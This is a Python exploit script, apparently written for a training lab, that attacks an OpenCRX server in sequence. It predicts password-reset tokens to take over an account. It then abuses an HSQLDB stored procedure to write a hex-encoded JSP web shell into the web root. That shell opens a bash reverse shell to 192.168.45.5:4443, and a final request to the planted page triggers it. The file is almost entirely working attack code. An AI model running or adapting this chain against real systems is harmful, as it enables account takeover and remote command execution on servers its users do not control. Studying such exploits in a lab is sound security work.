### python3 rev.py -t IP:8080 -u admin-Standard -p password123
### OpenCRXToken_ans.java

import requests
import sys
import time
import os
import argparse
import jaydebeapi

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='IP/URL', required=True)
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()

# start burp
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def genTime(ip):
    startMill = int(round(time.time()*1000))
    with open('time.txt','w') as f:
        f.write(str(startMill))
        f.write(',')

    target = "http://%s/opencrx-core-CRX/RequestPasswordReset.jsp" % args.target
    data = {'id': 'ACCOUNT_NAME'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    response = requests.post(target, headers=headers, data=data, proxies=proxies)
    
    # Print Apache response header
    print('HTTP/1.1', response.status_code)
    for name, value in response.headers.items():
        print(f'{name}: {value}')
    print(response.text)

def loginToken():
    print("Starting token spray. Standby.")

    target = "http://%s/opencrx-core-CRX/PasswordResetConfirm.jsp" % args.target

    with open('tokens.txt','r') as f:
        for word in f:
            data = {'t':word.rstrip(), 'p': 'CRX', 's': 'Standard', 'id': args.user, 'password1': args.password, 'password2': args.password}
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            response = requests.post(target, headers=headers, data=data, proxies=proxies)
            res = response.text

            if "Unable to reset password" not in res:
                print("Successful reset with token: %s" % word)
                break

def token():
    os.system('java OpenCRXToken_ans.java > tokens.txt')

def connDB():
    # Set up the JDBC driver and connection URL
    jdbc_driver = "org.hsqldb.jdbc.JDBCDriver"
    jdbc_url = "jdbc:hsqldb:hsql://DATABASE_HOST:9001/CRX"

    # Set up the connection properties
    conn_props = {"user": "XX", "password": "XXX"}

    # Open a connection to the database
    conn = jaydebeapi.connect(jdbc_driver, jdbc_url, conn_props)

    # Create a cursor object for executing SQL queries
    cursor = conn.cursor()

    # Call the writeBytesToFilename stored procedure
    try:
        sql = "CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024)) " + \
            "LANGUAGE JAVA DETERMINISTIC NO SQL " + \
            "EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'"
        writeTxt = "call writeBytesToFilename('/home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/a.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a2020202f2f537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a202020537472696e67206f7574707574203d2022223b0a0a202020202020537472696e672073203d206e756c6c3b0a202020202020747279207b0a2020202020202020202f2f50726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a2020202020202020200a20202020202020202052756e74696d652072203d2052756e74696d652e67657452756e74696d6528293b0a20202020202020202050726f636573732070203d20722e65786563286e657720537472696e675b5d7b222f62696e2f62617368222c222d63222c2262617368202d69203e26202f6465762f7463702f3139322e3136382e34352e352f3434343320303e2631227d293b0a2020202020202020204275666665726564526561646572207349203d206e6577204275666665726564526561646572286e657720496e70757453747265616d52656164657228702e676574496e70757453747265616d282929293b0a2020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d206e756c6c29207b0a2020202020202020202020206f7574707574202b3d20733b0a2020202020202020207d0a2020202020207d0a202020202020636174636828494f457863657074696f6e206529207b0a202020202020202020652e7072696e74537461636b547261636528293b0a2020202020207d0a2020200a253e0a0a3c7072653e0a3c253d6f757470757420253e0a' AS VARBINARY(1024)))"
        cursor.execute(sql)
        cursor.execute(writeTxt)
        
    except Exception as e:
    
        # jsp shell -> encode ASCII 
        writeTxt = "call writeBytesToFilename('/home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/a.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a2020202f2f537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a202020537472696e67206f7574707574203d2022223b0a0a202020202020537472696e672073203d206e756c6c3b0a202020202020747279207b0a2020202020202020202f2f50726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a2020202020202020200a20202020202020202052756e74696d652072203d2052756e74696d652e67657452756e74696d6528293b0a20202020202020202050726f636573732070203d20722e65786563286e657720537472696e675b5d7b222f62696e2f62617368222c222d63222c2262617368202d69203e26202f6465762f7463702f3139322e3136382e34352e352f3434343320303e2631227d293b0a2020202020202020204275666665726564526561646572207349203d206e6577204275666665726564526561646572286e657720496e70757453747265616d52656164657228702e676574496e70757453747265616d282929293b0a2020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d206e756c6c29207b0a2020202020202020202020206f7574707574202b3d20733b0a2020202020202020207d0a2020202020207d0a202020202020636174636828494f457863657074696f6e206529207b0a202020202020202020652e7072696e74537461636b547261636528293b0a2020202020207d0a2020200a253e0a0a3c7072653e0a3c253d6f757470757420253e0a' AS VARBINARY(1024)))"
        cursor.execute(writeTxt)

    # Commit the transaction to save changes to the database
    conn.commit()

    # Close the cursor and connection
    cursor.close()
    conn.close()

def rev():
    target = "http://%s/opencrx-core-CRX/a.jsp" % args.target
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    response = requests.get(target, headers=headers, proxies=proxies)
    print(response.text)

def main():
    ip = args.target
    print("Starting")

    genTime(ip)
    endMill = int(round(time.time()*1000))
    with open('time.txt','a') as f:
        f.write(str(endMill))

    token()

    loginToken()
    
    connDB()

    rev()

if __name__ == "__main__":
    main()
